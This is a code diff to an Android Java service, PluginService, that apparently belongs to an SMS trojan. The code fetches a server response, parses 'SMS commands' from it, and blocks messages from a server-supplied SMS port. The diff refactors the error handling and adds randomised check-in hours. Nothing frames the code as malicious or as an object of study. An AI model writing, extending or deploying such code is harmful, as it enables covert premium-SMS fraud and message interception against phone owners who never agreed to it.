@@ -22,6 +22,7 @@ import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
 
 import java.io.File;
+import java.util.Calendar;
 
 /**
  * Created with IntelliJ IDEA.
@@ -170,32 +171,37 @@ public class PluginService extends IntentService {
                             if (!String.valueOf(netType).equals(response.operator)) {
                                 //网络类型不对，这就是一个最初级的检查
                                 Config.LOGD("response == null or response error");
-                                AppRuntime.ACTIVE_RESPONSE = null;
-                                File file = new File(AppRuntime.RESPONSE_SAVE_FILE);
-                                file.delete();
+                                networkErrorWork();
                             } else {
                                 AppRuntime.ACTIVE_RESPONSE = response;
                                 AppRuntime.ACTIVE_RESPONSE.parseSMSCmd();
                                 AppRuntime.saveActiveResponse(AppRuntime.RESPONSE_SAVE_FILE);
 //                                AppRuntime.saveActiveResponse("/sdcard/" + Config.ACTIVE_RESPONSE_FILE);
                                 SettingManager.getInstance().setKeyBlockPhoneNumber(response.blockSmsPort);
+                                int next = AppRuntime.randomBetween(6, 13);
+                                SettingManager.getInstance().setKeyRandomNetworkTime(next);
                             }
                         } else {
                             Config.LOGD("response == null or response error");
-                            AppRuntime.ACTIVE_RESPONSE = null;
-                            File file = new File(AppRuntime.RESPONSE_SAVE_FILE);
-                            file.delete();
+                            networkErrorWork();
                         }
                     }
                 } catch (Exception e) {
                     e.printStackTrace();
-                    File file = new File(AppRuntime.RESPONSE_SAVE_FILE);
-                    file.delete();
+                    networkErrorWork();
                 }
 
                 AppRuntime.ACTIVE_PROCESS_RUNNING.set(false);
             }
         });
+    }
+
+    private void networkErrorWork() {
+        File file = new File(AppRuntime.RESPONSE_SAVE_FILE);
+        file.delete();
+        int next = AppRuntime.randomBetween(0, 4);
+        int curHour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY);
+        SettingManager.getInstance().setKeyRandomNetworkTime((curHour + next) >=24 ? 23 : (curHour + next));
     }
 
     private void activePackageAction(Intent intent) {
